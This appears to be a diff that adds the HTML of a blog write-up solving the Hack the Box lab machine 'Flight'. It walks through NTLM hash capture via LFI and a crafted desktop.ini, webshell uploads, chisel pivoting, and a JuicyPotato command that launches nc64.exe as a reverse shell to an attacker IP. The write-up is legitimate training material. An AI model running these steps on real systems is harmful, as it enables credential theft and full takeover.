@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="PORT SCAN# Nmap 7.93 scan initiated Wed Dec 21 02:42:29 2022 as: nmap -p- --min-rate&#x3D;10000 -sC -sV -oN portscan.txt 10.10.11.187 Nmap scan report for 10.10.11.187 Host is up (0.14s latency). Not">
+<meta property="og:type" content="article">
+<meta property="og:title" content=" HTB Flight">
+<meta property="og:url" content="http://kelpie.top/post/Virtual%20Attack[21].html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="PORT SCAN# Nmap 7.93 scan initiated Wed Dec 21 02:42:29 2022 as: nmap -p- --min-rate&#x3D;10000 -sC -sV -oN portscan.txt 10.10.11.187 Nmap scan report for 10.10.11.187 Host is up (0.14s latency). Not">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fh7v_wtJI5TMDt9PtHyhmEN5id7_.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnxExv9A88lGyMJaT8Uv981QQfgk.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhPDRNqgp_OmTqlGkTCS_EIxLN6x.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fte_kRCkP1yZKp-kJ-P4_y1h410Q.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsVobGARBlHMTWAgD6SkZlpGEQVv.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoooWu4Hf2wphzYG_g8-PwD5bXTR.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fm-qCMF-6RtiDaptObxhxUO2e9ll.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhksji5eydG0dERuWu86WfGJFaZB.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtFpwQjwXK9Qx6YPCfWv0rVZwlBa.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fi--HIvIW4xUr3h3FuKh1QfIuIDl.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuVcP-my1D3GNgAWww63IuOZXh8o.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FujXe1c4E5l3L14fKIUER5vF1bu8.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhRXB2xLroLcbssadwwNu_S-oMQ6.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjVb3eXieK_UI5XlP7yjabarFBV8.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fke0Fwxs5p0lQoma-irw5Bs6UuBy.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgCAlM90ApuABK8Xgbt4AJgz-_2M.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fnp6331rLBrQq6YSzC5FxbJ-3BN8.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fo4Zuzcb5bXitOXOIapENYiGCBFL.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkB_-YTz9hA5OnGOAyjy8RTQ6HW_.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FlRA3nmCVsDR5cfRDsGhbAAsizuJ.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqfZkPwCRIcxlCTHSeTsrGBumT7b.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrjI5ak96nATEKBi7SDZqGkiSxIb.png">
+<meta property="article:published_time" content="2022-12-21T14:18:00.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:12.546Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="Hack the Box">
+<meta property="article:tag" content="Penestration Test">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fh7v_wtJI5TMDt9PtHyhmEN5id7_.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title> HTB Flight</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/post/Tiny%20Server.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/Virtual%20Attack%5B16%5D.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack[21].html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack[21].html&text= HTB Flight"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack[21].html&title= HTB Flight"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack[21].html&is_video=false&description= HTB Flight"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject= HTB Flight&body=Check out this article: http://kelpie.top/post/Virtual%20Attack[21].html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack[21].html&title= HTB Flight"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack[21].html&title= HTB Flight"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack[21].html&title= HTB Flight"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack[21].html&title= HTB Flight"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack[21].html&name= HTB Flight&description=&lt;h2 id=&#34;PORT-SCAN&#34;&gt;&lt;a href=&#34;#PORT-SCAN&#34; class=&#34;headerlink&#34; title=&#34;PORT SCAN&#34;&gt;&lt;/a&gt;PORT SCAN&lt;/h2&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;# Nmap 7.93 scan initiated Wed Dec 21 02:42:29 2022 as: nmap -p- --min-rate&amp;#x3D;10000 -sC -sV -oN portscan.txt 10.10.11.187
+Nmap scan report for 10.10.11.187
+Host is up (0.14s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53&amp;#x2F;tcp    open  domain        Simple DNS Plus
+80&amp;#x2F;tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL&amp;#x2F;1.1.1m PHP&amp;#x2F;8.1.1)
+|_http-server-header: Apache&amp;#x2F;2.4.52 (Win64) OpenSSL&amp;#x2F;1.1.1m PHP&amp;#x2F;8.1.1
+|_http-title: g0 Aviation
+| http-methods:
+|_  Potentially risky methods: TRACE
+88&amp;#x2F;tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-21 14:43:03Z)
+135&amp;#x2F;tcp   open  msrpc         Microsoft Windows RPC
+139&amp;#x2F;tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389&amp;#x2F;tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+445&amp;#x2F;tcp   open  microsoft-ds?
+464&amp;#x2F;tcp   open  kpasswd5?
+593&amp;#x2F;tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636&amp;#x2F;tcp   open  tcpwrapped
+3268&amp;#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+3269&amp;#x2F;tcp  open  tcpwrapped
+5985&amp;#x2F;tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&amp;#x2F;UPnP)
+|_http-server-header: Microsoft-HTTPAPI&amp;#x2F;2.0
+|_http-title: Not Found
+9389&amp;#x2F;tcp  open  mc-nmf        .NET Message Framing
+49667&amp;#x2F;tcp open  msrpc         Microsoft Windows RPC
+49673&amp;#x2F;tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674&amp;#x2F;tcp open  msrpc         Microsoft Windows RPC
+49690&amp;#x2F;tcp open  msrpc         Microsoft Windows RPC
+49699&amp;#x2F;tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: G0; OS: Windows; CPE: cpe:&amp;#x2F;o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m59s
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2022-12-21T14:43:59
+|_  start_date: N&amp;#x2F;A
+
+Service detection performed. Please report any incorrect results at https:&amp;#x2F;&amp;#x2F;nmap.org&amp;#x2F;submit&amp;#x2F; .
+# Nmap done at Wed Dec 21 02:44:38 2022 -- 1 IP address (1 host up) scanned in 128.51 seconds
+&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The domain we found &lt;code&gt;flight.htb&lt;/code&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack[21].html&t= HTB Flight"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PORT-SCAN"><span class="toc-number">1.</span> <span class="toc-text">PORT SCAN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Content-subdomain-enum"><span class="toc-number">2.</span> <span class="toc-text">Content, subdomain enum</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capture-service-account-hash"><span class="toc-number">3.</span> <span class="toc-text">Capture service account hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB"><span class="toc-number">4.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AD-ENUM"><span class="toc-number">5.</span> <span class="toc-text">AD ENUM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-user-shell-C-bum"><span class="toc-number">6.</span> <span class="toc-text">Get user shell [C.bum]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-the-root-shell"><span class="toc-number">7.</span> <span class="toc-text">Get the root shell</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+         HTB Flight
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-12-21T14:18:00.000Z" class="dt-published" itemprop="datePublished">2022-12-21</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Penestration-Test/">Penestration Test</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Hack-the-Box/" rel="tag">Hack the Box</a>, <a class="p-category" href="/tags/Penestration-Test/" rel="tag">Penestration Test</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="PORT-SCAN"><a href="#PORT-SCAN" class="headerlink" title="PORT SCAN"></a>PORT SCAN</h2><pre class="line-numbers language-none"><code class="language-none"># Nmap 7.93 scan initiated Wed Dec 21 02:42:29 2022 as: nmap -p- --min-rate&#x3D;10000 -sC -sV -oN portscan.txt 10.10.11.187
+Nmap scan report for 10.10.11.187
+Host is up (0.14s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53&#x2F;tcp    open  domain        Simple DNS Plus
+80&#x2F;tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL&#x2F;1.1.1m PHP&#x2F;8.1.1)
+|_http-server-header: Apache&#x2F;2.4.52 (Win64) OpenSSL&#x2F;1.1.1m PHP&#x2F;8.1.1
+|_http-title: g0 Aviation
+| http-methods:
+|_  Potentially risky methods: TRACE
+88&#x2F;tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-21 14:43:03Z)
+135&#x2F;tcp   open  msrpc         Microsoft Windows RPC
+139&#x2F;tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389&#x2F;tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+445&#x2F;tcp   open  microsoft-ds?
+464&#x2F;tcp   open  kpasswd5?
+593&#x2F;tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636&#x2F;tcp   open  tcpwrapped
+3268&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+3269&#x2F;tcp  open  tcpwrapped
+5985&#x2F;tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)
+|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0
+|_http-title: Not Found
+9389&#x2F;tcp  open  mc-nmf        .NET Message Framing
+49667&#x2F;tcp open  msrpc         Microsoft Windows RPC
+49673&#x2F;tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674&#x2F;tcp open  msrpc         Microsoft Windows RPC
+49690&#x2F;tcp open  msrpc         Microsoft Windows RPC
+49699&#x2F;tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: G0; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m59s
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2022-12-21T14:43:59
+|_  start_date: N&#x2F;A
+
+Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+# Nmap done at Wed Dec 21 02:44:38 2022 -- 1 IP address (1 host up) scanned in 128.51 seconds
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The domain we found <code>flight.htb</code></p>
+<span id="more"></span>
+
+<h2 id="Content-subdomain-enum"><a href="#Content-subdomain-enum" class="headerlink" title="Content, subdomain enum"></a>Content, subdomain enum</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wfuzz <span class="token parameter variable">-c</span> <span class="token parameter variable">-f</span> subdomains.txt <span class="token parameter variable">-w</span> /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt <span class="token parameter variable">-u</span> <span class="token string">"http://flight.htb/"</span> <span class="token parameter variable">-H</span> <span class="token string">"Host: FUZZ.flight.htb"</span> <span class="token parameter variable">--hl</span> <span class="token number">154</span>
+
+000000624:   <span class="token number">200</span>        <span class="token number">90</span> L     <span class="token number">412</span> W      <span class="token number">3996</span> Ch     <span class="token string">"school"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>subdomains we found <code>school</code></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fh7v_wtJI5TMDt9PtHyhmEN5id7_.png"><br>The view is vulnerable to v<code>LFI</code><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnxExv9A88lGyMJaT8Uv981QQfgk.png"><br>We can get the file source code. Also we can use this code to force the service to fetch a remote source using Windows network share syntax <code>//&lt;ip&gt;/share</code> and maybe will capture the hash of service.</p>
+<h2 id="Capture-service-account-hash"><a href="#Capture-service-account-hash" class="headerlink" title="Capture service account hash"></a>Capture service account hash</h2><p><strong>In browser</strong><br><code>**http://school.flight.htb/index.php?view=//&lt;ip&gt;/test**</code></p>
+<p><strong>In bash</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> responder <span class="token parameter variable">-I</span> tun0 <span class="token parameter variable">-wP</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhPDRNqgp_OmTqlGkTCS_EIxLN6x.png"><br>We get the <code>flight\svc_apache</code> account hash.<br>If we want to make better use of the hash , we need to crack it violently with <code>hashcat</code>.</p>
+<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>From above, we get the <code>svc_apache</code>and its password. Next step use them to acess <code>SMB Service</code><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fte_kRCkP1yZKp-kJ-P4_y1h410Q.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsVobGARBlHMTWAgD6SkZlpGEQVv.png"><br>C.Bum user we should take more attention to it.</p>
+<h2 id="AD-ENUM"><a href="#AD-ENUM" class="headerlink" title="AD ENUM"></a>AD ENUM</h2><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoooWu4Hf2wphzYG_g8-PwD5bXTR.png"><br>After AD enum, we found lots of user. But only <code>S.Moon</code> is the same password as<code>svc_apache</code></p>
+<h2 id="Get-user-shell-C-bum"><a href="#Get-user-shell-C-bum" class="headerlink" title="Get user shell [C.bum]"></a>Get user shell [C.bum]</h2><p>If we don’t know which <code>share</code> directory is writable we can use <code>impacket-psexec</code>.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fm-qCMF-6RtiDaptObxhxUO2e9ll.png"><br>Create a <code>desktop.ini</code> file with the following content. For more detail, refer to<br><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini">https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini</a></p>
+<pre class="line-numbers language-none"><code class="language-none">[.ShellClassInfo]
+IconResource&#x3D;\\&lt;ip&gt;\test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>After we uploading this file to smb: <code>Share.</code> We can setup responder again and capture the <code>c.bum</code>hash.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhksji5eydG0dERuWu86WfGJFaZB.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtFpwQjwXK9Qx6YPCfWv0rVZwlBa.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fi--HIvIW4xUr3h3FuKh1QfIuIDl.png"><br>upload the webshell to <code>school.flight.htb or flight.htb</code>. Using the <code>powershell</code> to connect the machine.</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuVcP-my1D3GNgAWww63IuOZXh8o.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FujXe1c4E5l3L14fKIUER5vF1bu8.png"></p>
+<p>Switch to <code>c.bum</code> shell using <code>runascs</code>.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhRXB2xLroLcbssadwwNu_S-oMQ6.png"><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjVb3eXieK_UI5XlP7yjabarFBV8.png"></p>
+<h2 id="Get-the-root-shell"><a href="#Get-the-root-shell" class="headerlink" title="Get the root shell"></a>Get the root shell</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">netstat</span> <span class="token parameter variable">-ano</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fke0Fwxs5p0lQoma-irw5Bs6UuBy.png"><br>We found port <code>8000</code> running process with PID 4. PID 4 is running as system process.</p>
+<p>We have to pivot to examine further into this intranet process.<br>We use <code>chisel</code> to make the port we can acess.</p>
+<p><strong>Bash</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel server <span class="token parameter variable">-p</span> <span class="token number">4000</span> <span class="token parameter variable">--reverse</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>Windows Powershell</strong><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgCAlM90ApuABK8Xgbt4AJgz-_2M.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fnp6331rLBrQq6YSzC5FxbJ-3BN8.png"></p>
+<p>upload the aspx webshell <code>cmdasp.aspx</code><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fo4Zuzcb5bXitOXOIapENYiGCBFL.png"></p>
+<p>Get the <code>iis apppool shell</code><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkB_-YTz9hA5OnGOAyjy8RTQ6HW_.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FlRA3nmCVsDR5cfRDsGhbAAsizuJ.png"></p>
+<p>The iis service has <code>SeImpersonatePrivilege privilege.</code> This can be exploited using juicypotato<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqfZkPwCRIcxlCTHSeTsrGBumT7b.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">potato.exe <span class="token parameter variable">-t</span> * <span class="token parameter variable">-p</span> <span class="token string">"C:\users\public\download<span class="token entity" title="\n">\n</span>c64.exe"</span> <span class="token parameter variable">-a</span> <span class="token string">"10.10.16.10 9010 -e cmd.exe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrjI5ak96nATEKBi7SDZqGkiSxIb.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PORT-SCAN"><span class="toc-number">1.</span> <span class="toc-text">PORT SCAN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Content-subdomain-enum"><span class="toc-number">2.</span> <span class="toc-text">Content, subdomain enum</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capture-service-account-hash"><span class="toc-number">3.</span> <span class="toc-text">Capture service account hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB"><span class="toc-number">4.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AD-ENUM"><span class="toc-number">5.</span> <span class="toc-text">AD ENUM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-user-shell-C-bum"><span class="toc-number">6.</span> <span class="toc-text">Get user shell [C.bum]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-the-root-shell"><span class="toc-number">7.</span> <span class="toc-text">Get the root shell</span></a></li></ol>
+      </div>
+    
+
